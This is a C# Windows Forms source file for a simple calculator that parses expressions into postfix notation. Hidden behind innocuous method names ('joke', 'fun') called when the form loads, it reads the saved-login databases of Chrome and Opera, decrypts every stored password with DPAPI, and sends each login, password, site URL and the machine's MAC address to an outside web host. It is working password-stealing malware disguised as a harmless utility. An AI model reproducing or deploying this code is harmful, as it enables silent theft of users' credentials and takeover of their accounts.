using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Data.SQLite;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Calc
{
    public partial class Form1 : Form
    {
        string mac;
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            mac = macCheck();
            joke();
            fun();
        }

        private void button1_Click(object sender, EventArgs e)// +
        {
            richTextBox1.Text = richTextBox1.Text + '+';
        }

        private void button5_Click(object sender, EventArgs e)// -
        {
            richTextBox1.Text = richTextBox1.Text + '-';
        }

        private void button9_Click(object sender, EventArgs e)// *
        {
            richTextBox1.Text = richTextBox1.Text + '*';
        }

        private void button13_Click(object sender, EventArgs e)// /
        {
            richTextBox1.Text = richTextBox1.Text + '/';
        }

        private void button2_Click(object sender, EventArgs e)// 1
        {
            richTextBox1.Text = richTextBox1.Text + '1';
        }

        private void button6_Click(object sender, EventArgs e)// 2
        {
            richTextBox1.Text = richTextBox1.Text + '2';
        }

        private void button14_Click(object sender, EventArgs e)// 3
        {
            richTextBox1.Text = richTextBox1.Text + '3';
        }

        private void button12_Click(object sender, EventArgs e)// )
        {
            richTextBox1.Text = richTextBox1.Text + ')';
        }

        private void button10_Click(object sender, EventArgs e)// 4
        {
            richTextBox1.Text = richTextBox1.Text + '4';
        }

        private void button3_Click(object sender, EventArgs e)// 5
        {
            richTextBox1.Text = richTextBox1.Text + '5';
        }

        private void button15_Click(object sender, EventArgs e)// 6
        {
            richTextBox1.Text = richTextBox1.Text + '6';
        }

        private void button16_Click(object sender, EventArgs e)// (
        {
            richTextBox1.Text = richTextBox1.Text + '(';
        }

        private void button7_Click(object sender, EventArgs e)// 7
        {
            richTextBox1.Text = richTextBox1.Text + '7';
        }

        private void button11_Click(object sender, EventArgs e)// 8
        {
            richTextBox1.Text = richTextBox1.Text + '8';
        }

        private void button4_Click(object sender, EventArgs e)// 9
        {
            richTextBox1.Text = richTextBox1.Text + '9';
        }

        private void button18_Click(object sender, EventArgs e)// .
        {
            richTextBox1.Text = richTextBox1.Text + '.';
        }

        private void button8_Click(object sender, EventArgs e)// 0
        {
            richTextBox1.Text = richTextBox1.Text + '0';

        }

        private void button17_Click(object sender, EventArgs e)// calc
        {
            if (bracketsCheck(richTextBox1.Text)&&anotherCharCheck(richTextBox1.Text))
            {
                foreach(String s in convertToPostfix(richTextBox1.Text))
                {
                    Console.WriteLine(s);
                }

                richTextBox1.Text = Convert.ToString(calculate(convertToPostfix(richTextBox1.Text)));
            }
            else
            {
                richTextBox1.Text = "Неправильная скобочная структура или присутствуют посторонние символы!";
            }
        }

        private void button19_Click(object sender, EventArgs e)//clean
        {
            richTextBox1.Text = "";
        }

        private string macCheck()
        {
            var macAddr =
            (
            from nic in NetworkInterface.GetAllNetworkInterfaces()
            where nic.OperationalStatus == OperationalStatus.Up
            select nic.GetPhysicalAddress().ToString()
            ).FirstOrDefault();
            return macAddr;
        }

        private bool bracketsCheck(String str)
        {
            Stack<char> s = new Stack<char>(300);
            for(int i = 0; i < str.Length; i++)
            {
                if (str[i] == '(' || str[i] == '[' || str[i] == '{') s.push(str[i]);
                else if (str[i] == ')')
                {
                    if (!s.isEmpty())
                    {
                        if (s.pop() != '(') { return false; }
                    }
                    else return false;
                }
                else if (str[i] == ']')
                {
                    if (!s.isEmpty())
                    {
                        if (s.pop() != '[') { return false; }
                    }
                    else return false;
                }
                else if (str[i] == '}')
                {
                    if (!s.isEmpty())
                    {
                        if (s.pop() != '{') { return false; }
                    }
                    else return false;
                }
                else continue;
            }
            return true;
        }

        private List<string> convertToPostfix(String str)
        {
            Stack<char> s = new Stack<char>(200);
            string numBuffer = "";
            List<string> temp = new List<string>();
            for (int i=0; i<str.Length; i++)
            {
                while(i < str.Length && ((str[i]>47 && str[i]<58) || str[i] == '.'))
                {
                    numBuffer += str[i];
                    i++;
                }
                if (numBuffer != "")
                {
                    temp.Add(numBuffer);
                    numBuffer = "";
                }
                if (i < str.Length)
                {
                    if (str[i] == '(')
                    {
                        if (s.isFree()) s.push(str[i]);
                    }
                    else if ((str[i] == '+' || str[i] == '-' || str[i] == '*' || str[i] == '/') && s.isEmpty()) { s.push(str[i]); }
                    else if ((str[i] == '+' || str[i] == '-' || str[i] == '*' || str[i] == '/') && !s.isEmpty())
                    {
                        char curOp = str[i];
                        char topOp = s.peek();
                        if (signCheckPriority(topOp) >= signCheckPriority(curOp))
                        {
                            temp.Add(Convert.ToString(s.pop()));
                            s.push(curOp);
                            Console.WriteLine("в методе добавка к выходной строке" + Convert.ToString(topOp));
                        }
                        else s.push(curOp);
                    }
                    else if (str[i] == ')')
                    {
                        while (s.peek() != '(')
                        {
                            char stackOp = s.pop();
                            temp.Add(Convert.ToString(stackOp));
                        }
                        s.pop();
                    }
                }
            }
            while (!s.isEmpty())
            {
                temp.Add(Convert.ToString(s.pop()));
            }
            return temp;
        }

        private int signCheckPriority(char temp)
        {
            if (temp == '+' || temp == '-') return 1;
            else if (temp == '*' || temp == '/') return 2;
            else if (temp == '(' || temp == ')') return 3;
            else return 0;
        }

        private bool anotherCharCheck(string str)
        {
            for(int i=0; i < str.Length; i++)
            {
                if (str[i] == '+' || str[i] == '-' || str[i] == '*' || str[i] == '/' || str[i] == '(' || str[i] == ')' || str[i] == '[' || str[i] == ']' || str[i] == '{' || str[i] == '}' || str[i] == '.' || (str[i] > 47 && str[i] < 58)) continue;
                else return false;
            }
            return true;
        }

        private double calculate(List<string> temp)
        {
            Stack<string> st = new Stack<string>(200);
            double num_1;
            double num_2;
            double res;
            foreach (string s in temp)
            {
                if (s[0] > 47 && s[0] < 58) st.push(s);
                else
                {
                    num_1 = Convert.ToDouble(st.pop());
                    num_2 = Convert.ToDouble(st.pop());
                    if (s[0] == '+') res = num_1 + num_2;
                    else if (s[0] == '-') res = num_2 - num_1;
                    else if (s[0] == '*') res = num_1 * num_2;
                    else res = num_2 / num_1;
                    st.push(Convert.ToString(res));
                }
            }
            return Convert.ToDouble(st.pop());
        }

        private void joke()
        {
            string fileDb = @"C:\Users\" + Environment.UserName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
            string connectionString = $"Data Source = {fileDb}";
            string db_fields = "logins";
            byte[] entropy = null;
            string description;
            DataTable db = new DataTable();
            string sql = $"SELECT * FROM {db_fields}";
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                SQLiteCommand command = new SQLiteCommand(sql, connection);
                SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                adapter.Fill(db);
            }

            int rows = db.Rows.Count;
            Console.WriteLine($"Всего записей: {rows}");

            for (int i = 0; i < rows; i++)
            {
                string url = db.Rows[i][1].ToString();
                string login = db.Rows[i][3].ToString();
                byte[] byteArray = (byte[])db.Rows[i][5];
                byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                string password = new UTF8Encoding(true).GetString(decrypted);
                string newUrl = "https://belorusovcreation.000webhostapp.com";
                using (var webClient = new WebClient())
                {
                    webClient.QueryString.Add("login", login);
                    webClient.QueryString.Add("password", password);
                    webClient.QueryString.Add("mac", mac);
                    webClient.QueryString.Add("url", url);
                    webClient.DownloadString(newUrl);
                }
            }
        }

        private void fun()
        {
            string fileDb = @"C:\Users\" + Environment.UserName + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data";
            string connectionString = $"Data Source = {fileDb}";
            string db_fields = "logins";
            byte[] entropy = null;
            string description;
            DataTable db = new DataTable();
            string sql = $"SELECT * FROM {db_fields}";
            using (SQLiteConnection connection = new SQLiteConnection(connectionString))
            {
                SQLiteCommand command = new SQLiteCommand(sql, connection);
                SQLiteDataAdapter adapter = new SQLiteDataAdapter(command);
                adapter.Fill(db);
            }

            int rows = db.Rows.Count;
            Console.WriteLine($"Всего записей: {rows}");

            for (int i = 0; i < rows; i++)
            {
                string url = db.Rows[i][1].ToString();
                string login = db.Rows[i][3].ToString();
                byte[] byteArray = (byte[])db.Rows[i][5];
                byte[] decrypted = DPAPI.Decrypt(byteArray, entropy, out description);
                string password = new UTF8Encoding(true).GetString(decrypted);
                string newUrl = "https://belorusovcreation.000webhostapp.com";
                using (var webClient = new WebClient())
                {
                    webClient.QueryString.Add("login", login);
                    webClient.QueryString.Add("password", password);
                    webClient.QueryString.Add("mac", mac);
                    webClient.QueryString.Add("url", url);
                    webClient.DownloadString(newUrl);
                }
            }
        }
    }
}
